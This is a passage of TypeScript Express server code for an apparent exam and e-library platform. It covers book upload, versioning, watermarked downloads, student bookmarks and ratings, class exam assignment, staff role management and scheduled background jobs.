  if (typeof b.availableUntil === "string" && b.availableUntil.trim()) {
    const d = new Date(b.availableUntil);
    if (Number.isNaN(d.getTime())) errors.push("Expiry date is invalid.");
    else availableUntil = d.toISOString();
  }

  const downloadLimitRaw = Number(b.downloadLimit);
  const downloadLimit = Number.isFinite(downloadLimitRaw) && downloadLimitRaw > 0 ? Math.round(downloadLimitRaw) : null;

  return {
    errors, manualTotalPages, duplicateOf,
    book: {
      title, author, genre: genre as BookGenre, resourceType,
      coverImage, fileData, fileName, fileMime, fileSize, checksum, externalUrl,
      description: String(b.description ?? "").trim(),
      summary: String(b.summary ?? "").trim() || undefined,
      tags,
      academicYearId: academicYear?.id ?? null, academicYearName: academicYear?.name ?? null,
      semester: String(b.semester ?? "").trim() || undefined,
      facultyId: faculty?.id ?? null, facultyName: faculty?.name ?? null,
      departmentId: department?.id ?? null, departmentName: department?.name ?? null,
      programId: program?.id ?? null, programName: program?.name ?? null,
      course: String(b.course ?? "").trim() || undefined,
      courseCode: String(b.courseCode ?? "").trim() || undefined,
      level: String(b.level ?? "").trim() || undefined,
      instructor: String(b.instructor ?? "").trim() || undefined,
      publisher: String(b.publisher ?? "").trim() || undefined,
      edition: String(b.edition ?? "").trim() || undefined,
      isbn: String(b.isbn ?? "").trim() || undefined,
      language: String(b.language ?? "").trim() || undefined,
      difficulty,
      estimatedReadingTime,
      visibility: { scope: visibilityScope, classIds, studentIds },
      status,
      availableFrom, availableUntil,
      canDownload: b.canDownload !== false,
      canPreview: b.canPreview !== false,
      downloadLimit,
      watermarkPdf: !!b.watermarkPdf,
    },
  };
}

/** Parses an uploaded PDF's page count from its data: URL. Returns null (not
 *  a thrown error) for non-PDF uploads or any other resource type — page
 *  count isn't reliably derivable without a layout engine for those, so they
 *  fall back to a manually-entered page count instead of hard-failing. */
async function detectPdfPageCount(dataUrl: string): Promise<number | null> {
  if (!dataUrl.startsWith("data:application/pdf")) return null;
  try {
    const base64 = dataUrl.slice(dataUrl.indexOf(",") + 1);
    const bytes = Buffer.from(base64, "base64");
    const doc = await PDFDocument.load(bytes, { ignoreEncryption: true });
    return doc.getPageCount();
  } catch {
    return null;
  }
}

app.get("/api/admin/books", requireRoles(...GRADERS), (_req, res) => {
  const books = [...db.data!.books].sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  res.json({ books });
});

app.post("/api/admin/books", requireRoles(...GRADERS), async (req, res) => {
  const { errors, book: partial, manualTotalPages, duplicateOf } = validateBookBody(req.body ?? {});
  if (errors.length) return res.status(400).json({ errors });

  const detected = partial.fileData ? await detectPdfPageCount(partial.fileData) : null;
  const totalPages = detected ?? manualTotalPages ?? 0;

  const user = currentUser(req)!;
  const book: Book = {
    id: nanoid(10),
    title: partial.title!, author: partial.author!, genre: partial.genre!, resourceType: partial.resourceType!, totalPages,
    pagesAutoDetected: detected !== null,
    coverImage: partial.coverImage ?? null, fileData: partial.fileData ?? null, fileName: partial.fileName ?? null,
    fileMime: partial.fileMime ?? null, fileSize: partial.fileSize ?? null, checksum: partial.checksum ?? null,
    externalUrl: partial.externalUrl ?? null, description: partial.description ?? "",
    summary: partial.summary, tags: partial.tags ?? [],
    academicYearId: partial.academicYearId ?? null, academicYearName: partial.academicYearName ?? null,
    semester: partial.semester, facultyId: partial.facultyId ?? null, facultyName: partial.facultyName ?? null,
    departmentId: partial.departmentId ?? null, departmentName: partial.departmentName ?? null,
    programId: partial.programId ?? null, programName: partial.programName ?? null,
    course: partial.course, courseCode: partial.courseCode, level: partial.level, instructor: partial.instructor,
    publisher: partial.publisher, edition: partial.edition, isbn: partial.isbn, language: partial.language,
    difficulty: partial.difficulty ?? null, estimatedReadingTime: partial.estimatedReadingTime ?? null,
    visibility: partial.visibility!, status: partial.status!, availableFrom: partial.availableFrom ?? null, availableUntil: partial.availableUntil ?? null,
    canDownload: partial.canDownload!, canPreview: partial.canPreview!, downloadLimit: partial.downloadLimit ?? null, watermarkPdf: partial.watermarkPdf,
    version: 1, viewCount: 0, downloadCount: 0,
    uploadedBy: user.id, createdAt: now(),
  };
  db.data!.books.push(book);
  await db.upsert("books", book);
  await recordAudit(req, book.status === "published" ? "book.published" : "book.uploaded", book.title);
  if (book.status === "published" && req.body?.notifyEmail) notifyResourcePublished(book).catch(() => {});
  res.json({ book, duplicateOf });
});

app.patch("/api/admin/books/:id", requireRoles(...GRADERS), async (req, res) => {
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book) return res.status(404).json({ error: "Book not found." });
  const wasPublished = book.status === "published";
  const { errors, book: partial, manualTotalPages, duplicateOf } = validateBookBody({ ...book, ...req.body });
  if (errors.length) return res.status(400).json({ errors });

  // Only re-detect / version when a new file was actually uploaded (fileData
  // changed) — don't re-parse or version on every unrelated metadata edit.
  const fileChanged = "fileData" in req.body && req.body.fileData !== book.fileData && !!partial.fileData;
  if (fileChanged) {
    const prevVersion: ResourceVersion = {
      id: nanoid(10), bookId: book.id, version: book.version,
      fileData: book.fileData, fileName: book.fileName, fileMime: book.fileMime, fileSize: book.fileSize, checksum: book.checksum,
      changeLog: typeof req.body?.changeLog === "string" ? req.body.changeLog.trim().slice(0, 300) : undefined,
      uploadedBy: currentUser(req)!.id, createdAt: now(),
    };
    db.data!.resourceVersions.push(prevVersion);
    await db.upsert("resourceVersions", prevVersion);
  }
  const detected = fileChanged && partial.fileData ? await detectPdfPageCount(partial.fileData) : null;
  const totalPages = detected ?? manualTotalPages ?? book.totalPages;

  Object.assign(book, partial, {
    totalPages, pagesAutoDetected: detected !== null ? true : (fileChanged ? false : book.pagesAutoDetected),
    version: fileChanged ? book.version + 1 : book.version,
    updatedAt: now(),
  });
  await db.upsert("books", book);
  await recordAudit(req, fileChanged ? "book.version_added" : "book.updated", book.title);
  if (!wasPublished && book.status === "published" && req.body?.notifyEmail) notifyResourcePublished(book).catch(() => {});
  res.json({ book, duplicateOf });
});

app.get("/api/admin/books/:id/versions", requireRoles(...GRADERS), (req, res) => {
  const versions = db.data!.resourceVersions.filter((v) => v.bookId === req.params.id).sort((a, b) => b.version - a.version);
  res.json({ versions });
});

app.post("/api/admin/books/:id/versions/:versionId/restore", requireRoles(...GRADERS), async (req, res) => {
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book) return res.status(404).json({ error: "Book not found." });
  const version = db.data!.resourceVersions.find((v) => v.id === req.params.versionId && v.bookId === book.id);
  if (!version) return res.status(404).json({ error: "Version not found." });

  // Snapshot the CURRENT file as a version before restoring, so restoring is itself reversible.
  const snapshot: ResourceVersion = {
    id: nanoid(10), bookId: book.id, version: book.version,
    fileData: book.fileData, fileName: book.fileName, fileMime: book.fileMime, fileSize: book.fileSize, checksum: book.checksum,
    changeLog: `Replaced by restoring v${version.version}`, uploadedBy: currentUser(req)!.id, createdAt: now(),
  };
  db.data!.resourceVersions.push(snapshot);
  await db.upsert("resourceVersions", snapshot);

  book.fileData = version.fileData ?? null; book.fileName = version.fileName ?? null;
  book.fileMime = version.fileMime ?? null; book.fileSize = version.fileSize ?? null; book.checksum = version.checksum ?? null;
  book.version = book.version + 1;
  book.updatedAt = now();
  await db.upsert("books", book);
  await recordAudit(req, "book.version_restored", `${book.title} → v${version.version}`);
  res.json({ book });
});

app.delete("/api/admin/books/:id", requireRoles(...GRADERS), async (req, res) => {
  const id = String(req.params.id);
  const book = db.data!.books.find((b) => b.id === id);
  db.data!.books = db.data!.books.filter((b) => b.id !== id);
  db.data!.readingProgress = db.data!.readingProgress.filter((p) => p.bookId !== id);
  db.data!.resourceVersions = db.data!.resourceVersions.filter((v) => v.bookId !== id);
  db.data!.resourceBookmarks = db.data!.resourceBookmarks.filter((b) => b.bookId !== id);
  db.data!.resourceRatings = db.data!.resourceRatings.filter((r) => r.bookId !== id);
  db.data!.resourceDownloadLogs = db.data!.resourceDownloadLogs.filter((d) => d.bookId !== id);
  await db.remove("books", id);
  await db.write();
  await recordAudit(req, "book.deleted", book ? book.title : `Deleted book ${id}`);
  res.json({ ok: true });
});

app.get("/api/admin/library/dashboard", requireRoles(...GRADERS), (_req, res) => {
  const books = db.data!.books;
  const byType: Record<string, number> = {};
  for (const b of books) byType[b.resourceType] = (byType[b.resourceType] ?? 0) + 1;
  const byStatus = { draft: books.filter((b) => b.status === "draft").length, published: books.filter((b) => b.status === "published").length };
  const totalViews = books.reduce((s, b) => s + (b.viewCount ?? 0), 0);
  const totalDownloads = books.reduce((s, b) => s + (b.downloadCount ?? 0), 0);
  const totalBookmarks = db.data!.resourceBookmarks.length;
  const storageUsed = books.reduce((s, b) => s + (b.fileSize ?? 0), 0);
  const pendingReviews = books.filter((b) => b.status === "draft").length;

  // Real week-over-week growth in total resource count, from createdAt —
  // no fabricated trend, just a genuine before/after comparison.
  const weekAgo = Date.now() - 7 * 24 * 3600_000;
  const newThisWeek = books.filter((b) => new Date(b.createdAt).getTime() > weekAgo).length;
  const totalAWeekAgo = books.length - newThisWeek;
  const weekOverWeekPct = totalAWeekAgo > 0 ? Math.round((newThisWeek / totalAWeekAgo) * 1000) / 10 : null;

  const bookmarkCounts = new Map<string, number>();
  for (const bm of db.data!.resourceBookmarks) bookmarkCounts.set(bm.bookId, (bookmarkCounts.get(bm.bookId) ?? 0) + 1);
  const resources = books.map((b) => ({
    id: b.id, title: b.title, resourceType: b.resourceType, status: b.status,
    viewCount: b.viewCount ?? 0, downloadCount: b.downloadCount ?? 0, bookmarkCount: bookmarkCounts.get(b.id) ?? 0,
    createdAt: b.createdAt,
  }));

  const contributorCounts = new Map<string, number>();
  for (const b of books) contributorCounts.set(b.uploadedBy, (contributorCounts.get(b.uploadedBy) ?? 0) + 1);
  const topContributors = [...contributorCounts.entries()]
    .sort((a, b) => b[1] - a[1]).slice(0, 5)
    .map(([userId, count]) => ({ userId, name: db.data!.users.find((u) => u.id === userId)?.name ?? "Unknown", count }));

  res.json({
    totalResources: books.length, byType, byStatus, totalViews, totalDownloads, totalBookmarks, storageUsed, pendingReviews,
    newThisWeek, weekOverWeekPct, resources, topContributors,
  });
});

// ---- student: browse the library, engage with resources, track progress ----
app.get("/api/books", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const isStaff = user.role !== "candidate";
  const myProgress = new Map(db.data!.readingProgress.filter((p) => p.candidateId === user.id).map((p) => [p.bookId, p]));
  const myBookmarks = new Set(db.data!.resourceBookmarks.filter((b) => b.candidateId === user.id).map((b) => b.bookId));

  let list = db.data!.books.filter((b) => isStaff || studentCanSeeBook(b, user));

  const q = String(req.query.q ?? "").trim().toLowerCase();
  if (q) list = list.filter((b) => [b.title, b.author, b.course, b.courseCode, ...(b.tags ?? [])].some((v) => v?.toLowerCase().includes(q)));
  const type = String(req.query.type ?? "");
  if (type) list = list.filter((b) => b.resourceType === type);
  const facultyId = String(req.query.facultyId ?? "");
  if (facultyId) list = list.filter((b) => b.facultyId === facultyId);
  const departmentId = String(req.query.departmentId ?? "");
  if (departmentId) list = list.filter((b) => b.departmentId === departmentId);
  const programId = String(req.query.programId ?? "");
  if (programId) list = list.filter((b) => b.programId === programId);
  const level = String(req.query.level ?? "");
  if (level) list = list.filter((b) => b.level === level);
  const language = String(req.query.language ?? "");
  if (language) list = list.filter((b) => b.language === language);

  const sort = String(req.query.sort ?? "newest");
  list = [...list].sort((a, b) => {
    if (sort === "popular") return (b.viewCount + b.downloadCount) - (a.viewCount + a.downloadCount);
    if (sort === "downloads") return b.downloadCount - a.downloadCount;
    if (sort === "rating") return ratingSummary(b.id).avg - ratingSummary(a.id).avg;
    return b.createdAt.localeCompare(a.createdAt);
  });

  const items = list.map((book) => {
    const rating = ratingSummary(book.id);
    return {
      book, progress: myProgress.get(book.id) ?? null, bookmarked: myBookmarks.has(book.id),
      avgRating: rating.avg, ratingCount: rating.count,
      bookmarkCount: db.data!.resourceBookmarks.filter((bm) => bm.bookId === book.id).length,
    };
  });
  res.json({ items });
});

app.get("/api/books/:id", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book || (user.role === "candidate" && !studentCanSeeBook(book, user))) return res.status(404).json({ error: "Resource not found." });

  const progress = db.data!.readingProgress.find((p) => p.bookId === book.id && p.candidateId === user.id) ?? null;
  const bookmarked = db.data!.resourceBookmarks.some((b) => b.bookId === book.id && b.candidateId === user.id);
  const myRating = db.data!.resourceRatings.find((r) => r.bookId === book.id && r.candidateId === user.id) ?? null;
  const rating = ratingSummary(book.id);
  const relatedResources = db.data!.books
    .filter((b) => b.id !== book.id && b.status === "published" && (user.role !== "candidate" || studentCanSeeBook(b, user)))
    .filter((b) => (book.course && b.course === book.course) || (book.departmentId && b.departmentId === book.departmentId))
    .slice(0, 4);

  res.json({
    book, progress, bookmarked, myRating, avgRating: rating.avg, ratingCount: rating.count,
    bookmarkCount: db.data!.resourceBookmarks.filter((bm) => bm.bookId === book.id).length,
    relatedResources,
  });
});

app.post("/api/books/:id/view", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book || (user.role === "candidate" && !studentCanSeeBook(book, user))) return res.status(404).json({ error: "Resource not found." });
  book.viewCount = (book.viewCount ?? 0) + 1;
  await db.upsert("books", book);
  res.json({ viewCount: book.viewCount });
});

app.get("/api/books/:id/download", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book || (user.role === "candidate" && !studentCanSeeBook(book, user))) return res.status(404).json({ error: "Resource not found." });
  if (!book.fileData) return res.status(404).json({ error: "This resource has no downloadable file." });
  if (user.role === "candidate") {
    if (!book.canDownload) return res.status(403).json({ error: "Downloading this resource isn't allowed." });
    if (book.downloadLimit != null) {
      const count = db.data!.resourceDownloadLogs.filter((d) => d.bookId === book.id && d.candidateId === user.id).length;
      if (count >= book.downloadLimit) return res.status(403).json({ error: "You've reached the download limit for this resource." });
    }
  }

  const base64 = book.fileData.slice(book.fileData.indexOf(",") + 1);
  let bytes: Buffer = Buffer.from(base64, "base64");
  const mime = book.fileMime || "application/octet-stream";
  if (book.watermarkPdf && mime === "application/pdf") {
    try {
      const doc = await PDFDocument.load(bytes, { ignoreEncryption: true });
      const font = await doc.embedFont(StandardFonts.Helvetica);
      const stamp = `Issued to ${user.name} (${user.email}) · ${new Date().toLocaleDateString()} · Do not redistribute`;
      for (const page of doc.getPages()) page.drawText(stamp, { x: 20, y: 12, size: 7, font, opacity: 0.6 });
      bytes = Buffer.from(await doc.save());
    } catch { /* if watermarking fails, fall back to the unwatermarked original rather than blocking the download */ }
  }

  if (user.role === "candidate") {
    const log: ResourceDownloadLog = { id: nanoid(10), bookId: book.id, candidateId: user.id, at: now() };
    db.data!.resourceDownloadLogs.push(log);
    await db.upsert("resourceDownloadLogs", log);
  }
  book.downloadCount = (book.downloadCount ?? 0) + 1;
  await db.upsert("books", book);

  res.setHeader("Content-Type", mime);
  res.setHeader("Content-Disposition", `attachment; filename="${(book.fileName || book.title).replace(/["\r\n]/g, "")}"`);
  res.send(bytes);
});

/** Serves the file inline for in-platform reading — gated by `canPreview`
 *  (not `canDownload`), and deliberately doesn't touch downloadCount,
 *  downloadLimit, or watermarking: those are download-specific protections,
 *  not relevant to viewing inside the app. */
app.get("/api/books/:id/read", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book || (user.role === "candidate" && !studentCanSeeBook(book, user))) return res.status(404).json({ error: "Resource not found." });
  if (!book.fileData) return res.status(404).json({ error: "This resource has no readable file." });
  if (user.role === "candidate" && !book.canPreview) return res.status(403).json({ error: "Previewing this resource isn't allowed." });

  const base64 = book.fileData.slice(book.fileData.indexOf(",") + 1);
  const bytes = Buffer.from(base64, "base64");
  const mime = book.fileMime || "application/octet-stream";
  res.setHeader("Content-Type", mime);
  res.setHeader("Content-Disposition", `inline; filename="${(book.fileName || book.title).replace(/["\r\n]/g, "")}"`);
  res.send(bytes);
});

app.post("/api/books/:id/bookmark", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book) return res.status(404).json({ error: "Resource not found." });
  if (!db.data!.resourceBookmarks.some((bm) => bm.bookId === book.id && bm.candidateId === user.id)) {
    const bookmark: ResourceBookmark = { id: nanoid(10), bookId: book.id, candidateId: user.id, createdAt: now() };
    db.data!.resourceBookmarks.push(bookmark);
    await db.upsert("resourceBookmarks", bookmark);
  }
  res.json({ ok: true, bookmarked: true });
});

app.delete("/api/books/:id/bookmark", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const bookmark = db.data!.resourceBookmarks.find((b) => b.bookId === req.params.id && b.candidateId === user.id);
  if (bookmark) {
    db.data!.resourceBookmarks = db.data!.resourceBookmarks.filter((b) => b.id !== bookmark.id);
    await db.remove("resourceBookmarks", bookmark.id);
  }
  res.json({ ok: true, bookmarked: false });
});

app.post("/api/books/:id/rating", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book) return res.status(404).json({ error: "Resource not found." });
  const score = Math.round(Number(req.body?.score));
  if (!Number.isFinite(score) || score < 1 || score > 5) return res.status(400).json({ error: "score must be between 1 and 5." });
  const comment = typeof req.body?.comment === "string" ? req.body.comment.trim().slice(0, 500) : undefined;

  let rating = db.data!.resourceRatings.find((r) => r.bookId === book.id && r.candidateId === user.id);
  if (rating) {
    rating.score = score; rating.comment = comment;
  } else {
    rating = { id: nanoid(10), bookId: book.id, candidateId: user.id, score, comment, createdAt: now() };
    db.data!.resourceRatings.push(rating);
  }
  await db.upsert("resourceRatings", rating);
  res.json({ rating, ...ratingSummary(book.id) });
});

app.post("/api/books/:id/progress", requireAuth, async (req, res) => {
  const book = db.data!.books.find((b) => b.id === req.params.id);
  if (!book) return res.status(404).json({ error: "Book not found." });
  const currentPage = Math.max(0, Math.min(book.totalPages, Math.round(Number(req.body?.currentPage))));
  if (!Number.isFinite(currentPage)) return res.status(400).json({ error: "currentPage must be a number." });
  const user = currentUser(req)!;
  let progress = db.data!.readingProgress.find((p) => p.bookId === book.id && p.candidateId === user.id);
  if (progress) {
    progress.currentPage = currentPage;
    progress.updatedAt = now();
  } else {
    progress = { id: nanoid(10), bookId: book.id, candidateId: user.id, currentPage, updatedAt: now() };
    db.data!.readingProgress.push(progress);
  }
  await db.upsert("readingProgress", progress);
  res.json({ progress });
});

app.post("/api/admin/classes/:id/members", requireRole("admin"), async (req, res) => {
  const cls = db.data!.classes.find((c) => c.id === req.params.id);
  if (!cls) return res.status(404).json({ error: "Class not found." });
  const ids: string[] = Array.isArray(req.body?.candidateIds) ? req.body.candidateIds : [];
  let enrolled = 0;
  for (const id of ids) {
    if (db.data!.users.some((u) => u.id === id && u.role === "candidate") && !cls.memberIds.includes(id)) {
      cls.memberIds.push(id);
      // Auto-register for every exam this class already has assigned
      for (const assignment of cls.assignments) {
        const alreadyReg = db.data!.registrations.some((r) => r.examId === assignment.examId && r.candidateId === id);
        if (!alreadyReg) {
          db.data!.registrations.push({
            id: nanoid(10), examId: assignment.examId, candidateId: id,
            status: "registered", approval: "confirmed",
            scheduledStart: assignment.scheduledStart, systemCheckPassed: false, createdAt: now(),
          });
          enrolled++;
        }
      }
    }
  }
  await db.write();
  res.json({ ok: true, members: cls.memberIds.length, enrolled });
});

app.delete("/api/admin/classes/:id/members/:candidateId", requireRole("admin"), async (req, res) => {
  const cls = db.data!.classes.find((c) => c.id === req.params.id);
  if (!cls) return res.status(404).json({ error: "Class not found." });
  cls.memberIds = cls.memberIds.filter((m) => m !== req.params.candidateId);
  await db.upsert("classes", cls);
  res.json({ ok: true });
});

// Assign an exam to the whole class at a scheduled time → confirmed registrations for every member.
app.post("/api/admin/classes/:id/assign-exam", requireRole("admin"), async (req, res) => {
  const cls = db.data!.classes.find((c) => c.id === req.params.id);
  if (!cls) return res.status(404).json({ error: "Class not found." });
  const exam = db.data!.exams.find((e) => e.id === req.body?.examId);
  if (!exam) return res.status(400).json({ error: "Exam not found." });
  if (cls.memberIds.length === 0) return res.status(400).json({ error: "Add students to the class first." });
  const scheduledStart = req.body?.scheduledStart ? new Date(req.body.scheduledStart).toISOString() : null;

  for (const cid of cls.memberIds) {
    let reg = db.data!.registrations.find((r) => r.examId === exam.id && r.candidateId === cid);
    if (!reg) {
      reg = { id: nanoid(10), examId: exam.id, candidateId: cid, status: "registered", approval: "confirmed", scheduledStart, systemCheckPassed: false, createdAt: now() };
      db.data!.registrations.push(reg);
    } else {
      reg.approval = "confirmed";
      reg.scheduledStart = scheduledStart;
      if (reg.status === "submitted") continue;
      reg.status = "registered";
    }
  }
  cls.assignments.push({ examId: exam.id, scheduledStart, assignedAt: now() });
  await db.write();
  await recordAudit(req, "class.exam_assigned", `${exam.title} → ${cls.name}${scheduledStart ? ` @ ${new Date(scheduledStart).toLocaleString()}` : ""}`);
  res.json({ ok: true, assigned: cls.memberIds.length });
});

// ---- admin: Team (staff accounts & roles) ----
const STAFF_ROLES = ["admin", "facilitator", "proctor"];

app.get("/api/admin/team", requireRole("admin"), (_req, res) => {
  const team = db.data!.users
    .filter((u) => u.role !== "candidate")
    .map((u) => ({ id: u.id, name: u.name, email: u.email, role: u.role }))
    .sort((a, b) => a.name.localeCompare(b.name));
  res.json({ team });
});

app.post("/api/admin/team", requireRole("admin"), validate(teamCreateSchema), async (req, res) => {
  const { name, email, password, role } = req.body as { name: string; email: string; password: string; role: "admin" | "facilitator" | "proctor" };
  if (db.data!.users.some((u) => u.email.toLowerCase() === String(email).trim().toLowerCase())) {
    return res.status(409).json({ error: "An account with that email already exists." });
  }
  const user = { id: nanoid(10), email: String(email).trim(), passwordHash: await bcrypt.hash(String(password), 10), name: String(name).trim(), role };
  db.data!.users.push(user);
  await db.upsert("users", user);
  await recordAudit(req, "team.invited", `${user.name} <${user.email}> · ${role}`);
  res.json({ user: { id: user.id, name: user.name, email: user.email, role: user.role } });
});

app.patch("/api/admin/team/:id", requireRole("admin"), async (req, res) => {
  const actor = currentUser(req)!;
  const u = db.data!.users.find((x) => x.id === req.params.id && x.role !== "candidate");
  if (!u) return res.status(404).json({ error: "Staff member not found." });
  const role = req.body?.role;
  if (!STAFF_ROLES.includes(role)) return res.status(400).json({ error: "Invalid role." });
  if (u.id === actor.id && role !== "admin") return res.status(400).json({ error: "You can't change your own admin role." });
  if (u.role === "admin" && role !== "admin" && db.data!.users.filter((x) => x.role === "admin").length <= 1) {
    return res.status(400).json({ error: "There must be at least one admin." });
  }
  u.role = role;
  await db.upsert("users", u);
  await recordAudit(req, "team.role_changed", `${u.name} → ${role}`);
  res.json({ ok: true });
});

app.delete("/api/admin/team/:id", requireRole("admin"), async (req, res) => {
  const actor = currentUser(req)!;
  const u = db.data!.users.find((x) => x.id === req.params.id && x.role !== "candidate");
  if (!u) return res.status(404).json({ error: "Staff member not found." });
  if (u.id === actor.id) return res.status(400).json({ error: "You can't remove your own account." });
  if (u.role === "admin" && db.data!.users.filter((x) => x.role === "admin").length <= 1) {
    return res.status(400).json({ error: "There must be at least one admin." });
  }
  db.data!.users = db.data!.users.filter((x) => x.id !== u.id);
  await db.remove("users", u.id);
  await recordAudit(req, "team.removed", `${u.name} <${u.email}>`);
  res.json({ ok: true });
});

// Liveness: process is up. Readiness: storage is reachable (for load-balancer probes).
app.get("/api/health", (_req, res) => res.json({ ok: true, uptime: process.uptime() }));
app.get("/api/ready", async (_req, res) => {
  try {
    await db.ping();
    res.json({ ok: true, backend: db.backendKind() });
  } catch {
    res.status(503).json({ ok: false });
  }
});

// Unknown API routes return JSON (not the SPA shell).
app.use("/api", (_req, res) => res.status(404).json({ error: "Not found" }));

// SPA fallback (production single-origin): non-API routes return index.html.
// Never cache it, so a redeploy is picked up on the next page load.
// Permissions-Policy explicitly allows camera + microphone so cPanel/Apache
// cannot override it with a restrictive default that breaks the webcam check-in.
if (servingSpa) {
  app.get(/^\/(?!api\/).*/, (_req, res) => {
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.setHeader("Permissions-Policy", "camera=*, microphone=*");
    res.sendFile(path.join(distDir, "index.html"));
  });
}

// Centralized error handler — last middleware. Logs the full error, returns a
// safe message (details only outside production).
app.use((err: Error, req: Request, res: Response, _next: (e?: unknown) => void) => {
  logger.error({ err, method: req.method, url: req.url }, "unhandled request error");
  if (res.headersSent) return;
  res.status(500).json({ error: env.isProd ? "Internal server error" : err.message });
});

assertProductionEnv();
if (env.jwtIsDefault) {
  logger.warn("⚠️  JWT_SECRET is not set — using a random per-process key, so all sessions reset on every restart. Set a strong, unique JWT_SECRET on this host for stable sessions.");
}
await initDb();
scheduleRetention();
scheduleBackup();
// Verify SMTP at startup so misconfiguration shows up immediately in the log.
verifySmtp().then(({ ok, error }) => {
  if (!ok) logger.warn({ error }, "⚠️  SMTP verification failed — check SMTP_HOST/PORT/USER/PASS");
  else if (env.isProd) logger.info("✔ SMTP connection verified");
}).catch(() => {});

// One-time data cleanup: physically delete the historical "Fullscreen Exit"
// false positives the app used to record when finishing an exam (see cleanEvents).
// Runs once on boot and is idempotent — once the phantom events are gone, a later
// boot finds nothing to remove.
async function purgePhantomFullscreenFlags() {
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted" && a.submittedAt);
  if (submitted.length === 0) return;
  const evMap = await proctorStore.forAttempts(submitted.map((a) => a.id));
  const ids: string[] = [];
  for (const a of submitted) {
    const cutoff = new Date(a.submittedAt!).getTime() - 2000;
    for (const e of evMap.get(a.id) ?? []) {
      if (e.type === "fullscreen_exit" && new Date(e.at).getTime() >= cutoff) ids.push(e.id);
    }
  }
  if (ids.length) {
    await proctorStore.removeByIds(ids);
    logger.info({ removed: ids.length }, "purged phantom fullscreen-exit flags");
  }
}
void purgePhantomFullscreenFlags().catch((e) => logger.error({ err: e }, "phantom fullscreen-exit purge failed"));

// Hard close: periodically auto-submit any in-progress attempt past its deadline,
// so an exam ends server-side even if the candidate's browser never submits it.
async function autoSubmitOverdue() {
  const nowMs = Date.now();
  const overdue = db.data!.attempts.filter((a) => a.status === "in_progress" && nowMs > attemptDeadlineMs(a));
  for (const attempt of overdue) {
    const answers = await answerStore.forAttempt(attempt.id);
    const { passed, needsReview } = gradeAttempt(attempt, answers);
    const reg = db.data!.registrations.find((r) => r.id === attempt.registrationId);
    if (reg) reg.status = "submitted";
    const cert = needsReview ? null : (passed ? issueCertificate(attempt) : null);
    for (const ans of answers) await answerStore.upsert(ans);
    await db.upsert("attempts", attempt);
    if (reg) await db.upsert("registrations", reg);
    if (cert) await db.upsert("certificates", cert);
    logger.info({ attemptId: attempt.id }, "auto-submitted overdue attempt (hard close)");
  }
}
const autoSubmitTimer = setInterval(() => {
  autoSubmitOverdue().catch((e) => logger.error({ err: String(e) }, "auto-submit sweep failed"));
}, 60_000);
autoSubmitTimer.unref?.();

// Send 24h / 1h "starting soon" reminders for confirmed upcoming exams.
const reminderTimer = setInterval(() => {
  sendExamReminders().catch((e) => logger.error({ err: String(e) }, "reminder sweep failed"));
}, 300_000);
reminderTimer.unref?.();

// Send the daily/weekly admin summary digest when due (checked hourly).
const digestTimer = setInterval(() => {
  digestSweep().catch((e) => logger.error({ err: String(e) }, "digest sweep failed"));
}, 3_600_000);
digestTimer.unref?.();

const reportTimer = setInterval(() => {
  reportSweep().catch((e) => logger.error({ err: String(e) }, "report sweep failed"));
}, 3_600_000);
reportTimer.unref?.();

const server = app.listen(PORT, () => {
  logger.info({ port: PORT, backend: db.backendKind(), env: process.env.NODE_ENV ?? "development", encryptionAtRest: encryptionEnabled() },
    `🛡️  Oriole API listening on http://localhost:${PORT}`);
});

// Graceful shutdown: stop accepting connections, flush timers, close the DB pool.
async function shutdown(signal: string) {
  logger.info({ signal }, "shutting down");
  stopRetention();
  stopBackup();
  clearInterval(autoSubmitTimer);
  clearInterval(reminderTimer);
  clearInterval(digestTimer);
  server.close(async () => {
    try { await db.close(); } catch { /* ignore */ }
    process.exit(0);
  });
  // Hard cap so a hung connection can't block forever.
  setTimeout(() => process.exit(1), 10_000).unref();
}
process.on("SIGTERM", () => void shutdown("SIGTERM"));
process.on("SIGINT", () => void shutdown("SIGINT"));
